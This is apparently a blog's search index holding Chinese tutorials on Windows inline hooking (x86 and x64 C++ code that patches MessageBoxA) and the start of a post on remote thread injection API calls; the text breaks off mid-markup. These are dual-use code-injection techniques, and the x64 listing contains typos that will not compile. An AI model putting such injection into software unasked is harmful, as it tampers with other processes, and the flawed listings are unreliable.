<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Inline Hook</title>
      <link href="/1b00de47.html"/>
      <url>/1b00de47.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>Inline Hook(内联钩子注入)流程</strong></p><ol><li>构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]</li><li>在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节</li><li>将构造的跳转指令写入需HOOK的位置处</li><li>当被HOOK位置被执行时会转到自己的流程执行</li><li>如果要执行原来的流程，取消HOOK，还原被修改的字节</li><li>执行原来的流程</li><li>继续HOOK住原来的位置</li></ol></div><span id="more"></span><h2 id="仓库地址"><a href="#仓库地址" class="headerlink" title="仓库地址"></a>仓库地址</h2><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/Dooookey/Inline_Hook"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=Dooookey&repo=Inline_Hook&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.xaoxuu.com/api/pin/?username=Dooookey&repo=Inline_Hook&show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></a><h2 id="5字节Inline-Hook（x86）"><a href="#5字节Inline-Hook（x86）" class="headerlink" title="5字节Inline Hook（x86）"></a>5字节Inline Hook（x86）</h2><div class="note message"><p><strong></strong></p><ul><li>5字节<code>Inline Hook</code>中jcc指令长度为5</li><li>根据计算公式：JMP后的偏移量 &#x3D; 目标地址 - 原地址- 5</li></ul></div><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PROC m_FuncAddress;     <span class="comment">// 要Hook的函数地址</span></span><br><span class="line">BYTE m_OldBytes[<span class="number">5</span>];     <span class="comment">// 要Hook函数的头5个字节</span></span><br><span class="line">BYTE m_NewBytes[<span class="number">5</span>];     <span class="comment">// 要替换到目标函数头五个字节的新字节（jmp xxxxxxxx/ E9 xxxxxxxx）</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pszModuleName, <span class="type">const</span> <span class="type">char</span>* pszFuncName, PROC pfnHookFunc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_FuncAddress = (PROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    m_NewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(m_NewBytes + <span class="number">1</span>) = (DWORD)pfnHookFunc - (DWORD)m_FuncAddress - <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m_FuncAddress != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m_FuncAddress != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyMessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UnHook</span>();</span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">MessageBoxA</span>(hWnd, <span class="string">&quot;Hello Dokey&quot;</span>, <span class="string">&quot;Hello Dokey&quot;</span>, uType);</span><br><span class="line">    <span class="built_in">ReHook</span>();</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// VA Virtual Address </span></span><br><span class="line"><span class="comment">// HMODULE hModule 模块加载基址 ImageBase  模块句柄</span></span><br><span class="line"><span class="comment">// DWORD  ul_reason_for_call 以什么原因触发的</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// MessageBox(NULL, &quot;Dokey&quot;, &quot;Dokey&quot;, MB_OK);</span></span><br><span class="line">        m_FuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(m_OldBytes, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">memset</span>(m_NewBytes, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">Hook</span>(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>, (PROC)MyMessageBoxA);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="built_in">UnHook</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7字节Inline-Hook（x86）"><a href="#7字节Inline-Hook（x86）" class="headerlink" title="7字节Inline Hook（x86）"></a>7字节Inline Hook（x86）</h2><div class="note message"><p><strong></strong></p><ul><li>5字节<code>Inline Hook</code>通过构造一个jmp指令来修改目标函数入口的字节内容，jmp指令后面的偏移量是由于CPU机器码要求jmp指令后是一个偏移量</li><li>7字节<code>Inline Hook</code>通过修改函数入口的两条指令来完成<ul><li>一条是把目标地址存入寄存器<code>eax</code>中: <code>mov eax, xxxxxxxx / B8 xxxxxxxx</code></li><li>然后用jmp指令直接跳转到寄存器<code>eax</code>中保存的地址: <code>jmp eax / FF E0</code></li><li>通过指令的机器码是不变的，变化的只有地址，需要将目标函数地址保存在从第一至第四字节的位置就可以了</li><li><code>Byte bJmpCode[] = {&#39;\xb8&#39;, &#39;\0&#39;, &#39;\0&#39;, &#39;\0&#39;, &#39;\0&#39;, &#39;\xff&#39;, &#39;\xe0&#39;}</code></li></ul></li></ul></div><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PROC m_FuncAddress;</span><br><span class="line">BYTE m_OldBytes[<span class="number">7</span>];</span><br><span class="line">BYTE m_NewBytes[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pszModuleName, <span class="type">const</span> <span class="type">char</span>* pszFuncName, PROC pfnHookFunc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_FuncAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    m_NewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xb8&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">5</span>] = <span class="string">&#x27;\xff&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">6</span>] = <span class="string">&#x27;\xe0&#x27;</span>;</span><br><span class="line">    *(DWORD*)(m_NewBytes + <span class="number">1</span>) = (DWORD)pfnHookFunc;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12字节Inline-Hook（x64）"><a href="#12字节Inline-Hook（x64）" class="headerlink" title="12字节Inline Hook（x64）"></a>12字节Inline Hook（x64）</h2><div class="note message"><p><strong></strong></p><ul><li>原理： <code>mov rax, Address/jmp rax</code>;</li><li>硬编码： <code>Byte[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0}</code></li></ul></div><h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PROC m_FuncAddress;</span><br><span class="line">BYTE m_OldBytes[<span class="number">12</span>];</span><br><span class="line">BYTE m_NewBytes[<span class="number">12</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pszModulesName, <span class="type">const</span> <span class="type">char</span>* pszFuncName, PROC pfnHookFunc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_FuncAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span> (m_FuncAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">    m_NewBytes[<span class="number">0</span>] = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">1</span>] = <span class="string">&#x27;\xb8&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">10</span>] = <span class="string">&#x27;\xff&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">11</span>] = <span class="string">&#x27;\xe0&#x27;</span>;</span><br><span class="line">    *(DWORD64*)(m_NewBytes + <span class="number">2</span>) = (DWORD64)pfnHookFunc;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SITE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZTE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyMessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UnHook</span>();</span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">MessageBoxA</span>(hWnd, <span class="string">&quot;Dokey 12&quot;</span>, <span class="string">&quot;Dokey 12&quot;</span>, uType);</span><br><span class="line">    <span class="built_in">ReHook</span>();</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UnHook</span>();</span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">MessageBoxW</span>(hWnd, <span class="string">L&quot;Dokey 12&quot;</span>, <span class="string">L&quot;Dokey 12&quot;</span>, uType);</span><br><span class="line">    <span class="built_in">ReHook</span>();</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MyMessageBox MyMessageBoxW</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> MessageBoxText = <span class="string">&quot;MessageBoxW&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MyMessageBox MyMessageBoxA</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> MessageBoxText = <span class="string">&quot;MessageBoxA&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程线程注入</title>
      <link href="/cf459526.html"/>
      <url>/cf459526.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><ul><li>远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。</li></ul></div><span id="more"></span><h2 id="CreateRemoteThread-远程线程注入"><a href="#CreateRemoteThread-远程线程注入" class="headerlink" title="CreateRemoteThread 远程线程注入"></a>CreateRemoteThread 远程线程注入</h2><h3 id="OpenProcess-函数"><a href="#OpenProcess-函数" class="headerlink" title="OpenProcess 函数"></a>OpenProcess 函数</h3><blockquote><p>打开现有的本地进程对象</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInheritHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwProcessId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>OpenProcess</strong></p><ul><li><code>dwDesiredAccess</code>: 访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或多个进程访问权限。</li><li><code>bInheritHandle</code>: 此进程创建的进程是否可以继承该句柄</li><li><code>dwProcessId</code>: 要打开的本地进程PID</li></ul><hr><ul><li>如果函数成功，则返回值是打开指定进程的句柄</li><li>如果函数失败，则返回值为NULL</li></ul></div><h3 id="VirtualAllocEx-函数"><a href="#VirtualAllocEx-函数" class="headerlink" title="VirtualAllocEx 函数"></a>VirtualAllocEx 函数</h3><blockquote><p>在指定进程的虚拟地址空间内保留、提交或更改内存状态</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>VirtualAllocEx</strong></p><ul><li><code>hProcess</code>: 进程句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有<code>PROCESS_VM_OPERATION</code>权限</li><li><code>lpAddress</code>: 指定要分配页面所需起始地址的指针。如果<code>lpAddress</code>为NULL，则该函数自动分配内存</li><li><code>dwSize</code>: 要分配内存大小，以字节为单位</li><li><code>flAllocationType</code>: 内存分配类型。此参数必须为以下值之一</li></ul><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>MEM_COMMIT</td><td>在磁盘分页和整体内存中，为指定预留内存页分配内存</td></tr><tr><td>MEM_RESERVE</td><td>保留进程中虚拟地址空间的范围，但不会在磁盘或内存上的分页文件中分配任何实际物理存储位置</td></tr><tr><td>MEM_RESET</td><td>表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入</td></tr><tr><td>MEM_RESET_UNDO</td><td>只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO</td></tr></tbody></table><ul><li><code>flProtect</code>: 要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则<code>flProtect</code>不能是以下值之一<ul><li><code>PAGE_NOACCESS</code></li><li><code>PAGE_GUARD</code></li><li><code>PAGE_NOCACHE</code></li><li><code>PAGE_WRITECOMBINE</code></li></ul></li></ul><hr><p>如果函数成功，则返回值是分配页面的基址<br>如果函数失败，则返回值为NULL</p></div><h3 id="WriteProcessMemory-函数"><a href="#WriteProcessMemory-函数" class="headerlink" title="WriteProcessMemory 函数"></a>WriteProcessMemory 函数</h3><blockquote><p>在指定进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(nSize) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>WriteProcessMemory</strong></p><ul><li><code>hProcess</code>: 要修改的进程内存句柄。句柄必须具有PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION访问权限</li><li><code>lpBaseAddress</code>: 指向指定进程中写入数据的基地址指针。在数据传输之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败</li><li><code>lpBuffer</code>: 指向缓冲区指针。其中包含要写入指定进程的地址空间中的数据</li><li><code>nSize</code>: 要写入指定进程的字节数</li><li><code>lpNumberOfBytesWritten</code>: 指向变量指针，该变量接收传输到指定进程的字节数。如果<code>lpNumberOfBytesWritten</code>为NULL，则忽略该参数</li></ul><hr><p>如果函数成功，则返回值不为零<br>如果函数失败，则返回值为零</p></div><h3 id="CreateRemoteThread-函数"><a href="#CreateRemoteThread-函数" 